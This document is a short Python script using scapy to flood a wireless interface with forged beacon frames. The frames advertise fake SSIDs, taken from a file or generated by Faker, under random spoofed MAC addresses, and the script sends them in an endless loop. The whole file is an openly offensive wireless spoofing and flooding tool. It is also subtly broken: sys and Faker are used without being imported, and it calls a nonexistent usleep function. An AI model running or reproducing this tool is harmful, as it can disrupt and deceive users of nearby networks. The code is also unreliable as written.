
from scapy.layers.dot11 import *

INTERFACE = "wlan0"

if __name__ == '__main__':
    # If a first argument is given, use it as a file containing SSIDs
    if len(sys.argv) >= 2:
        ssid_file = sys.argv[1]

        # Read all lines of file containing ssids
        with open(ssid_file, 'r') as f:
            ssids = f.readlines()

    else:
        # Ask user to input an integer as a fallback
        num_ssid = input("Enter the number of SSIDs to generate: ")

        # Use Faker to generate random SSIDs
        ssids = [ Faker().word() for _ in range(int(num_ssid)) ]

    # Generate random MAC addresses for each SSID
    macs = [ Faker().mac_address() for _ in range(len(ssids)) ]

    while (True):
        print("Flooding with SSID, use CTRL+C to stop...")

        for ssid, mac in zip(ssids, macs):
            # Boradcast the ssid
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
            beacon = Dot11Beacon()
            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            frame = RadioTap() / dot11 / beacon / essid
            sendp(frame, iface=INTERFACE, verbose=0)

            # Wait a bit to not flood TOO much
            usleep(100)


